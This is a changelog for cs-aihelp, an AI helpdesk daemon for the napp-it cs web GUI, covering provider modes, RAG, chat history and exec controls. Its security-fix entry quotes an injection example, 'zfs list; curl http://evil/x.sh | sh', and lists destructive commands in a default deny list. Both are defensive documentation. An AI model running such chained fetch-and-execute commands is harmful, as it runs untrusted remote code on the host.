# Changelog

## (2026-08-26, Perl/JS only -- no Go daemon change, no new binary release) — KISS chat history auto-load

- **The chat widget and full-screen chat now auto-load the last open
  conversation on render**, separately for the popup widget and the
  full-screen page (each keeps its own "current conversation" via a
  client-side cookie: `aihelp_conv_popup` / `aihelp_conv_page`). Until now
  every page render started with an empty log; only a manual click on
  **Resume** brought back the previous conversation (and only "the
  newest one", not per-context). "Ask AI" itself still only toggles CSS
  visibility, as before -- this is purely about what shows up once the
  widget/page renders in the first place.
- The cookie just remembers *which* conversation ID to reload -- the
  server-side history storage and its `history`/expire setting
  (off/today/week/month/6months/all) are unchanged and keep working
  exactly as before. A cookie pointing at an already-expired/cleaned-up
  conversation is dropped silently on load (no error shown), and a fresh
  question with no cookie present behaves exactly as before (empty log).
- `data/menues/_lib/windows/aihelplib.pl` (`ai_chat_js()`): new
  `_aiCookieName()`/`_aiCookieGet()`/`_aiCookieSet()` helpers; `_aiNew()`
  clears the cookie; `handleMeta()` and `_aiResume()` write the active
  conv ID to it; new `_aiAutoLoad()` (invoked once at the end of the
  generated `<script>` block) loads it via the existing `action=load`
  server endpoint (loads a specific conversation by ID, unlike
  `action=resume` which only knows "the newest for this member" and
  can't distinguish widget vs. full-screen state).
- Verified: `perl -c` clean, full `tests/run_tests.ps1` suite (86/86)
  still passes against a fresh checkout.

## v1.2.0 (2026-08-26) — remove silent setup-fallback

- **Removed the automatic `fallback=free` retry** in `askInternal()`
  (`go/app.go`). Previously, when a `mode=provider` call failed
  (unreachable endpoint, wrong/expired key, timeout), the daemon silently
  retried via the local/free tier and labeled the answer *"via free
  (Fallback)"*. Decided this is a bigger surprise than a visible error: a
  user who deliberately configured (and is often paying for) a specific
  provider should see the failure and fix it, not unknowingly get an
  answer from a different, uncontrolled model. A failing provider call
  now returns the error directly.
- `DefaultConfig().Fallback` changed from `"free"` to `"off"`
  (`go/config.go`) to match. The `fallback` config key is still parsed
  from existing config files (so old `fallback = free` lines don't break
  anything) but is no longer read/acted on anywhere -- fully inert.
  Mirrors the Settings-UI side (`data/menues/.../12_AI_Helpdesk/action.pl`),
  which already force-writes `fallback = off` on every Save since the UI
  pass that preceded this Go change.
- No config migration needed; existing `_cfg/cs-aihelp` files keep
  working as-is, just without the silent-retry behavior going forward.

## v1.1.6 (2026-08-26) — transparent Local-docs/General-AI answers + relevance fix

- **System prompt now always structures answers into two labeled
  sections** — `"Local docs:"` (strictly grounded in the retrieved
  documentation excerpts; never invents napp-it-specific commands, menu
  paths or settings; says so explicitly when the docs don't cover the
  question) and `"General AI:"` (the model's own general knowledge,
  always included, even when the docs already answered fully). Previously
  the prompt said "use ONLY the documentation excerpts" for
  napp-it-specific questions, which the model applied too literally even
  to plain background/terminology questions (e.g. "what is SMB"),
  refusing to use its general knowledge at all. `systemPrompt()` in
  `go/rag.go`; mirrored in the Perl-side `ai_system_prompt()`
  (`data/menues/_lib/windows/aihelplib.pl`) for the legacy fallback path.
- **Fixed doc-retrieval relevance ranking** — `RagIndex.Retrieve()`
  previously scored purely on raw keyword-occurrence count, with no
  weighting for term specificity. Common filler words matching many
  generic docs could outscore the one doc actually about the topic (e.g.
  a question naming `cs-sync` could lose to `services.info` /
  `guideline.info` under the top-4 cap, because those also happened to
  contain frequent short words from the question). Now adds a strong
  score bonus when a query word appears in the **filename** itself, so a
  topic-naming question reliably surfaces its matching doc. Sort switched
  to `sort.SliceStable` (ties not needlessly reshuffled by Go's
  randomized map iteration order).
- Both fixes verified with a standalone Go test against a small doc set:
  `Retrieve("was macht cs-sync", 4)` now ranks `cs-sync.info` first
  (previously excluded from the top 4 in the equivalent unweighted
  scoring).

## v1.1.5 (2026-08-25) — OpenRouter as a selectable mode=provider option

- **OpenRouter is now also selectable as a full `provider` (mode=provider),
  not just the mode=free fallback leg added in v1.1.4.** Provider dropdown
  (Settings + Provider2) gained an `openrouter` entry; `callProvider()`'s
  endpoint/model default tables gained an `openrouter` case (endpoint
  `https://openrouter.ai/api/v1/chat/completions`, default model
  `meta-llama/llama-3.1-8b-instruct:free`). Uses the existing OpenAI-compatible
  request path (Bearer `api_key` header) -- no new code path needed, since
  OpenRouter is OpenAI-compatible. Mirrored in `aihelplib.pl`'s `ai_resolve()`
  and the AI Helpdesk settings form (`Provider` / `Provider 2` selects).
  Lets a user run OpenRouter's free `:free` model routes as the *primary*
  provider (mode=provider) instead of only as a free-mode fallback leg.

## v1.1.4 (2026-08-25) — OpenRouter as a third mode=free leg

- **New optional `mode=free` fallback leg: OpenRouter** (`openrouter_key` /
  `openrouter_model` config keys). OpenAI's API has no free tier at all (a
  card is required from the first call), but OpenRouter offers real
  zero-cost `:free` model routes -- still gated by a free-to-create account
  + API key though, unlike Ollama (local, no account) or Pollinations
  (keyless GET), so it's an opt-in third leg rather than a default one.
  Chain order: local Ollama -> OpenRouter (only if `openrouter_key` is set)
  -> Pollinations. Buffered (`freeOpenRouter`) and streaming
  (`freeOpenRouterStream`, reuses the existing OpenAI-compatible SSE
  parser) variants added; default model
  `meta-llama/llama-3.1-8b-instruct:free` (overridable -- OpenRouter's
  free-route roster changes over time).
- **`freeModeError()` extended to 3 legs**: now reports Ollama / OpenRouter /
  Pollinations status individually and, when no `openrouter_key` is set,
  hints at getting a free key from openrouter.ai as an alternative to
  installing Ollama.

## v1.1.3 (2026-08-25) — free-mode error text in English

- **`freeModeError()` / `ollamaProbeError()` messages translated from German
  to English** (`no free provider available -- Ollama: ...; Pollinations:
  ...`) -- the widget/UI is English, so v1.1.2's detailed error text (added
  the same day) should have been English from the start rather than German.
  No change to the logic, only to the message text and the internal
  substring match used to tell "Ollama unreachable" apart from "Ollama up,
  no model pulled" (now matches on "no model installed").

## v1.1.2 (2026-08-25) — meaningful free-mode errors + popup fixes

- **`mode=free` failure now reports what actually happened with each fallback
  leg** instead of one generic "kein kostenloser Provider erreichbar" message:
  the widget/UI now shows e.g. "Ollama: nicht erreichbar ...; Pollinations:
  http 402" so a "no local Ollama" case is distinguishable from Pollinations'
  free anonymous tier rejecting the request (their legacy `text.pollinations.ai`
  endpoint has started returning `402 Payment Required` for anonymous/keyless
  requests on some networks -- an upstream change, not a bug here). The error
  also points at the fix: install Ollama, or switch to `mode=provider` with an
  API key under System > Services > AI Helpdesk.
- **Popup widget z-index raised to `2147483000`** (was `9997`/`9998`) so it no
  longer renders behind the top menu bar in some layouts.

## v1.1.1 (2026-08-25) — security hardening (audit follow-up)

**Fixes for weaknesses found in a usability/function/security review of
Help > AI Helpdesk, System > CS Tools Download, System > Services > AI
Helpdesk and the AIHelp popup.**

- **`exec_access=exec` (D2) now rejects shell metacharacters** (`; & | \` $( `)
  outright — previously the allow list only matched the first word/prefix of
  the proposed command (e.g. `zfs`), so a command like
  `zfs list; curl http://evil/x.sh | sh` passed both the allow check (prefix
  `zfs`) and the deny check (no denied substring), letting a chained,
  unreviewed second command ride along on an approved class. `exec_access=exec`
  is now strictly single-command; use `exec_access=console` (arbitrary shell,
  deny-only, fully-trusted admins only) when chaining is genuinely required.
  (`aihelplib.pl` `ai_exec_validate`)
- **Allow-list prefix matching now requires a word boundary** — `zfs` in
  `exec_allow` could previously match `zfsdestroy`-style typosquats via plain
  `index($cmd,$a)==0`; now the character right after the matched prefix must
  be whitespace or end-of-string. (`aihelplib.pl` `ai_exec_validate`)
- **Config file permission hardening on Windows**: `_cfg/cs-aihelp` (holds
  `api_key`/`api_key2`/`auth_token`) previously only got `chmod 0600` on
  Unix (`_ai_chmod0600` was a no-op on `MSWin32`). Both the Perl config
  writer and the Go daemon's `Config.Save()` now additionally lock the file
  down via `icacls` on Windows (inheritance disabled, access limited to the
  running account + built-in Administrators `S-1-5-32-544`) — best-effort,
  non-fatal if `icacls` is unavailable. (`aihelplib.pl` `_ai_chmod0600`,
  `go/config.go` `lockdownConfigFile`)
- **`cs-aihelp start` now mirrors `serve`'s auth_token refusal**: starting the
  daemon detached on a non-loopback `listen` address without `auth_token`
  previously only failed silently inside the detached process (the caller —
  Settings UI Start button, boot autostart — saw no error). `startCmd` now
  performs the same check up front and exits with a clear stderr message.
  (`go/cmd.go` `startCmd`)
- **Settings page warns when `exec_access != ro` and `research != off` are
  both active** — web research results reach the model as untrusted DATA;
  combined with exec capability this widens the prompt-injection blast
  radius, especially with `exec_mode=auto` (no human confirmation). New
  warning banner on System > Services > AI Helpdesk.
  (`10_System/05_Services/12_AI_Helpdesk/action.pl`)
- **Documentation**: `ai-helpdesk.info` SECURITY MODEL section now documents
  the D2 metacharacter rejection, the exec+research warning, the known SSRF
  guard limitation (literal-IP check only, no DNS-rebinding protection —
  `endpoint`/`research_endpoint` are admin-only trusted settings, not a hard
  guarantee against a malicious hostname), and the Windows config-file ACL
  hardening.
- No functional/behavioral change for the default configuration
  (`exec_access=ro`, `research=ddg`) — these fixes only change behavior once
  `exec_access` is raised above `ro`.
- Tests: Go `go vet` + `go test ./...` green after the `config.go`/`cmd.go`
  changes (verified in CI sandbox); Perl `aihelplib.pl` syntax-checked
  (`perl -c`, OK) — full Perl functional suite / PowerShell E2E not
  re-executed as part of this pass.

## dev (2026-08-24) - Helpdesk UI + i18n refinement (host-side)

**Per-question provider + mode choice, mini popup, translated field list.**

- **Settings form**: field hints minimized (one/two words, English); below the
  form a detailed per-field list via `$txt{'ai_f_*'}` from the new
  `lang/<lang>/system.txt` (all 7 languages). Slot label `Mode` -> `Mode 1`.
- **Helpdesk page**: independent per-question choice of **provider**
  (`mode1`/`mode2` = slot 1/2) and **mode** (`plan` = ro, `act` = exec) as two
  selects, plus Actions (propose/confirm/auto). Buttons `Ask`/`Abort`/`Resume`/
  `New`. `Enter` inserts a newline, sending happens only via `Ask`.
- **Popup**: title `mini AI Helpdesk`, `[x]` closes it, provider select
  `mode1`/`mode2` before `Ask`/`New`.
- **cs-aihelp.pl**: `action=load`/`resume` moved before the question guard
  (`load` was unreachable); new `action=resume` returns the newest saved
  conversation of the member (Resume button).
- **help.txt**: JS strings + quick questions now in all 7 languages; key set
  aligned (21 consumed keys) in every language.
- **P2 (DONE)**: `cs-aihelp.pl` is now a session-gated proxy to the Go daemon
  (`/ask` over loopback, HTTPS webserver cert, Bearer `auth_token`). RAG,
  provider call (Ollama/OpenAI), web research, history and action parsing run
  in Go. **SSE token streaming** end-to-end: the daemon streams tokens
  (`data:{"t":...}` + `event: done`), the proxy passes them through over a raw
  socket (de-chunked, TLS via IO::Socket::SSL with system fallback), the JS
  renders them progressively. New daemon endpoint **`/resume`** (newest
  conversation of the member, Go-side). `Enter` inserts a newline, sending
  happens only via `Ask`.
- **Config**: daemon network keys (`listen`, `auth_token`, `allowed_ip`,
  `cors_origin`, `tls_cert`, `tls_key`) are now preserved by the Settings save
  (fixes a data-loss bug) and forwarded by the proxy.
- **Menu rename**: `System > CS Tools` -> **`System > CS Tools Download`**
  (m10.03, en+de; other languages use the English fallback). The page now
  offers a **local AI (Ollama)** section: status, platform download link
  (Linux/macOS/Windows only), a background **Pull model** form via the Ollama
  API (no shell, `ai_ollama_pull_bg`), plus a link to the AI Helpdesk
  settings. The cs-aihelp **daemon start/stop** moved from CS Tools to
  **System > Services > AI Helpdesk** (download/update stays in CS Tools
  Download, no more auto-start after download).

## v1.1 (2026-08-24) — pre-release / release candidate

**Published on GitHub as the newest downloadable release (marked as
pre-release / RC in the README) so it can be tested before the stable v1.1.0.
The stable path remains v1.0.2.**

- Same code as **v1.1rc2** (tag `v1.1rc2`, commit `01ca3b5`), released under
  the clean version tag `v1.1` — binaries report `1.1`, module archive
  `cs-aihelp-1.1.tar.gz`.
- Includes everything from v1.1.0 below, plus the CS Tools distribution
  extension and all commits on `main` since `v1.1rc`.

## v1.1.0 (2026-08-24)

**Two provider slots (Cline-style) + localised UI (Basisregel) + KISS history.**

- **`mode2` / `provider2` / `endpoint2` / `model2` / `api_key2` /
  `free_model2`** — a second provider slot for the **act/exec** model
  (slot 1 = plan/read-only). Empty `mode2` falls back to slot 1. The
  Helpdesk toolbar offers **Provider `Plan | Act` toggle buttons** (the
  popup a `plan|act` select + Ask) — `provider_use` in the request,
  answered as `provider_use` in the response; the Go daemon resolves the
  same way (`applyProviderSlot`).
- **Settings form** (under System > Services, m-key `m10.05.12`):
  English element labels + short English hints stay English (Basisregel);
  a detailed, translated **info section after the form** comes from the new
  language files `lang/{en,de}/ai_helpdesk.txt` (`ai_*` keys, ≤ 3 words).
- **Help page** (first item in the Help menu, `00_AI_Helpdesk`, m-key
  `m05.00`): English toolbar, quick questions / status / confirm / info
  texts translated via `lang/{en,de}/help.txt`, **Plan mode is the default**
  ("Plan first" checked), provider selector added.
- **Popup:** "Ask AI" (read-only), English labels, small Provider selector.
- **KISS history:** one chat history per member — the picker/`_aiLoadConv`
  is gone; `New` clears, `history` retention only deletes old turns.
- **Distribution via System > CS Tools:** all cs tools (cs-aihelp,
  cs-sleeper, cs-sync, cs-send, cs-stream, cs-freeze4snap) are **not
  bundled** in napp-it cs — the `10_System/03_CS_Tools` menu
  (`cstoolslib.pl` registry) lists tool / current version / newest version
  in a **100% width table** with a **download/update** link. Only the
  **frontend-OS** binary is fetched (tar archives `.tar.gz` and raw
  binaries are both supported) and installed keeping the **OS structure**
  (`data/cs_server/tools/<tool>/<platform>.<arch>/`), so
  `csweb-gui/data` can be copied to another OS. Newest versions are
  **cached for 1 h** (`_cfg/cstools_versions`, avoids GitHub rate limits).
  A second table manages the **local AI Helpdesk**: installed version,
  running/stopped, [Settings] link, **Start/Stop** and **Update**.
  The AI Helpdesk settings show *"please download CS tools first"* when
  the daemon is missing. v1.1rc was released as a **pre-release**.
- Tests: Perl 86/86, Go vet + unit green (slot tests in Perl #4b and
  `go/lifecycle_test.go`).

## v1.0.2 (2026-08-24)

**Level 2: exec + AI-Dialog (A3) + Status-Ampel AI dot.**

- **`exec_access = ro|exec|console`** (default `ro`): the AI's command
  scope. `ro` = read-only (no proposals, no execution). `exec` = proposals
  only from the D2 allow list. `console` = optional remote-console mode
  (only `exec_deny` applies).
- **`exec_mode = propose|confirm|auto`** (default `confirm`): `propose` =
  the AI may only show a command, never execute. `confirm` (recommended) =
  every exec needs a click on "Ausführen" in the browser. `auto` = the
  agentic loop runs without per-step confirmation.
- **`exec_allow` / `exec_deny`**: comma-separated allow list of command
  classes/prefixes (D2), pipe-separated deny list that ALWAYS wins
  (default `zfs destroy|zpool destroy|rm -rf|dd |mkfs|format`). An empty
  `exec_allow` means nothing may execute.
- **Execution happens in a new session-gated Perl CGI
  (`cgi-bin/cs-aihelp-exec.pl`)**, never in the Go daemon — the daemon is
  the proposer only. The CGI validates allow/deny and runs the command
  over the existing encrypted `&socket()`/`&exe()` channel.
- **A3 agentic loop (browser-orchestrated):** the daemon/Perl layer accept
  `tool_results`, extract a proposed `[[ACTION]]{...}[[/ACTION]]` block
  from the answer, return it as `action`, and feed the executed command's
  output back into the conversation — the AI can search pools, analyze
  and fix bugs step by step.
- **Full-screen AI Helpdesk (100% width/height):** toolbar (ro/exec/
  console radio, propose/confirm/auto select, optional "Plan zuerst"
  toggle, Abbrechen, Neu, Verlauf), 2:3 split — question on top, live
  transcript below with per-step 🧠 answer → 🔧 action card → ✅ output.
- **Popup:** read-only helper, freely draggable, size configurable via
  `widget_input_lines` and `widget_answer_height`.
- **Status-Ampel AI dot** (last dot, local read of `_cfg/cs-aihelp`):
  grey = disabled, green = read-only, blue = exec (click shows
  mode/exec_access/exec_mode/exec_allow).
- **Daemon lifecycle** — `cs-aihelp serve` writes a PID file
  (Unix `/var/run/cs-aihelp.pid`, Windows next to the config) and removes
  it on shutdown; new `cs-aihelp start` subcommand (detached, idempotent —
  skips when the listen port is already in use); `stop` is now
  cross-platform (`taskkill /PID … /F` on Windows instead of SIGINT).
- **`autostart = on|off`** (default `on`): `server_boot_tasks.pl` (server.pl
  boot hook) starts the Go daemon automatically at every server start when
  `mode != off` and the binary exists at
  `data/cs_server/tools/cs-aihelp[.exe]`; `install.pl` copies the binary
  there if it sits next to the installer.
- Tests: Perl 82/82, Go vet + unit green; new Level-2 unit tests
  (`exec_test.go`, Perl #24-29), `exec_e2e.ps1` and `lifecycle_smoke.ps1`
  (start/status/stop end-to-end).

## v1.0.1 (2026-08-24)

- **`ssrf_allow_private = no|yes`** (default `no`): allows RFC1918/private
  endpoints (LAN-only **remote Ollama** / local OpenAI-compatible servers);
  link-local, cloud-metadata and reserved ranges stay blocked. Makes the
  free tier usable on FreeBSD/illumos/Solaris via a remote Ollama host.
- **Ollama probe cache**: `/api/tags` reachability is cached for 30 s — no
  more 2 s latency per free question when Ollama is absent (falls through
  to Pollinations immediately).
- **Rate limit** (`rate_limit`, default 60): per-client-IP token bucket in
  the daemon (0 = off) — protects remote listeners from abuse.
- All three keys are editable in the settings menu and read by both the
  Go daemon and the Perl layer.

## v1.0.0 (2026-08-24)

**cs-aihelp is now an independent Go daemon** (`go/`), built for 8 platforms
(`CGO_ENABLED=0`), always ready in the background with its own memory
(in-memory RAG index, persisted chat history, reloadable config).

- CLI: `serve` (HTTPS daemon) · `ask` · `status` · `stop` · `reindex` · `version`.
- Endpoints: `GET /health /status /sources /models`, `POST /ask` (JSON/SSE),
  `POST /reload /reindex`.
- Remote reachable over HTTPS using the `webserver.pl` certificate
  (`_cfg/webserver/cert/server.crt`/`.key`).
- Security: IP allowlist (`allowed_ip`) + constant-time bearer token
  (`auth_token`), SSRF guard on configured endpoints, config files `0600`.
- All AI features ported from the Perl module: free/provider + fallback, RAG,
  web research (ddg/api), chat history, Level 1 read-only diagnostics.
- Security audit fixes (from the pre-implementation audit):
  - SSRF guard (provider + research endpoints),
  - `chmod 0600` on config/history,
  - no question text in logs (new `log` config key).
- Tests: Go unit tests (`go test ./...`) + Perl functional suite (49 checks).
- GitHub Actions: CI (Go vet+test, Perl tests) and Release (8-platform Go
  binaries + module archive + checksums).

## v0.5 (2026-08-24)

Initial public release of the **cs-aihelp** AI Helpdesk module for napp-it cs.

- Chat-based helpdesk inside the napp-it cs web-GUI (own menu `Help > AI
  Helpdesk`, plus a draggable context-sensitive popup on every page).
- Three modes (`_cfg/cs-aihelp`):
  - `free` (default): local Ollama auto-detect, falls back to a
    Pollinations.AI GET -- no account, no API key.
  - `provider`: Anthropic / OpenAI (or any OpenAI-compatible endpoint) /
    Ollama with optional API key.
  - `off`: disabled.
- Setup fallback: `fallback=free` (default) answers via the free tier when
  `mode=provider` fails (unreachable / wrong key), marked "via free (Fallback)".
- Light-RAG over `data/howto.ai/*.info` (napp-it knowledge base).
- Stufe 1: optional read-only live state (hostname, zpool list) as DATA context.
- Web research: `research=ddg` (DuckDuckGo Lite, no key, default) or
  `research=api` (any external JSON search endpoint, e.g. Google CSE, Brave,
  Bing, SearXNG, Serper -- response shape auto-detected).
- Chat history in `_cfg/aihelp/conv_*.json`, retention configurable
  (off | today | week | month | 6months | all, default month), resume via list.
- UX: quick questions, copy button, elapsed-time indicator, new conversation,
  friendly error texts, HTML-escaped answers.
- Stufe 2 (exec_mode propose/confirm/auto + allowlist) reserved, not implemented.
- Tests: `tests/ai_helpdesk_test.pl` against a local mock server (38 checks).
